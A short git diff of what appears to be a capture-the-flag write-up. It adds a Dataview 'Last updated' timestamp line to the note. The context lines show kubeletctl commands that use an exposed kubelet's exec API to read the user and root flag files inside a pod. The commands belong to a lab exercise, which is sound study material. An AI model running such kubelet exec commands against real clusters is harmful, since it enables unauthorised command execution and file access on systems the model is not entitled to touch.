@@ -100,3 +100,6 @@ kubeletctl --server $TARGET exec "cat /root/home/user/user.txt" -p nginxt -c ngi
 ```bash - kali
 kubeletctl --server $TARGET exec "cat /root/root/root.txt" -p nginxt -c nginxt
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
